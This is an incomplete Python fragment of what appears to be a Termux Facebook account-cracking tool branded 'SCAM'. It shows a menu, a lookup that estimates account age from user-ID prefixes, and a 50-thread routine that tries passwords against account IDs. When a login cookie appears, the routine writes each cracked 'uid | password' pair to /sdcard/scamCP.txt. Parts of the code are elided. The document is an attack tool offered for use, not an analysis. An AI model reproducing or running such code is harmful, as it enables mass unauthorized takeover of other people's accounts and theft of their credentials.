...
def o():
    ...
    print(" \033[38;5;46mSCAM")
    SCAM = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m Choice Option \033[38;5;196m: ')
    if SCAM == 'A':
        SCAM()
    if SCAM == 'B':
        os.system('xdg-open https://www.facebook.com/scam2020')
        return None
    if SCAM == 'C':
        os.system('xdg-open /')
        return None
    if SCAM == 'D':
        os.system('xdg-open https://www.github.com/SCAM')
        return None
    if SCAM == 'E':
        os.system('exit')
        return None
...
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
 ...
 \033[38;5;46mSCAM×
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mASRAFUL ISLAM SCAM   \033[38;5;46m|
 ...
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;195mSCAM               \033[38;5;46m|
 ...
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m SCAM TERMUX HELPING ZONE....
 \033[38;5;46mSCAM×""")
def linex():
	print(' \033[38;5;46mSCAM×')
loop = 0
...
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :SCAM = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :SCAM = ' ~> 2009'
        elif uid[:8] in ['10000000']        :SCAM = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:SCAM = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:SCAM = ' 2010'
        elif uid[:6] in ['100001']          :SCAM = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :SCAM = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :SCAM = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :SCAM = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :SCAM = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :SCAM = ' ~> 2015'
        elif uid[:5] in ['10001']           :SCAM = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :SCAM = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :SCAM = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :SCAM = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :SCAM = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:SCAM = ' ~> 2021'
        elif uid[:5] in ['10008']           :SCAM = ' ~>2022'
        elif uid[:5] in ['10009']           :SCAM = ' ~> 2023'
        else:SCAM=''
...
def SCAM():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL OWNER \033[1;97m: \033[38;5;45mASRAFUL ISLAM SCAM')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [scam-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/scamCP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sSCAM\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
